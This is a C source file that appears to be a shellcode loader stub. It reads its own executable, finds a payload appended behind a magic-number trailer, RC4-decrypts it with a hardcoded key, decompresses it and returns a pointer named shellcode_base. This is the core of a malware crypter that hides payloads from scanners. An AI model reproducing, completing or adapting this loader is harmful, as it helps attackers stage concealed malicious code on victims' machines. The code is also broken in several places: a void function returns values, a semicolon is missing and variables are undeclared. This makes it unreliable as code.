#include "header.h"

void *read_file (const u8 * filename, size_t * file_size) {
  FILE *file = fopen(filename, "rb");
  if (!file) return NULL;

  fseek(file, 0, SEEK_END);
  long size = ftell(file);
  rewind(file);

  void *file_buffer = malloc(size);
  size_t read_size = fread(file_buffer, 1, size, file);
  fclose(file);

  *file_size = size;
  return file_buffer;
}

// Define metadata struct
typedef struct {
    uint32_t magic;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
} PayloadInfo;

#define MAGIC_NUMBER 0x50444B50 // "PKDP"
#define KEY /*"KEYMARKERABCDEFG"*/ "1234567891234567" // 16 character key for RC4

u32 rc4(unsigned char *data, size_t data_len, unsigned char *key, size_t key_len) {
    unsigned char S[256];
    unsigned char K[256];
    unsigned char temp;
    int i, j = 0, t;

    for (i = 0; i < 256; i++) {
        S[i] = i;
        K[i] = key[i % key_len];
    }

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    i = j = 0;
    for (t = 0; t < data_len; t++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        data[t] ^= S[(S[i] + S[j]) % 256];
    }

    return success;
}


void load_payload_to_mem(unsigned int *enc_shellcode_size, char **shellcode_base)
{
size_t exe_size = 0;
  char exe_path[1024] = { 0 };

  GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
  const unsigned char * src0 = read_file(exe_path, &exe_size);

  if (!src0) return -1;
  if (exe_size < sizeof(PayloadInfo)) return -1;

  PayloadInfo * info = (PayloadInfo *)(src0 + exe_size - sizeof(PayloadInfo));
  if (info->magic != MAGIC_NUMBER) return -1;

  unsigned char * payload = src0 + exe_size - sizeof(PayloadInfo) - info->compressed_size;

  rc4(payload, info->compressed_size, KEY, strlen(KEY));

  src = malloc(info->uncompressed_size);
  lz_decompress(payload, info->compressed_size, src , &info->uncompressed_size);

  *enc_shellcode_size = info->uncompressed_size
  *shellcode_base = src;
}
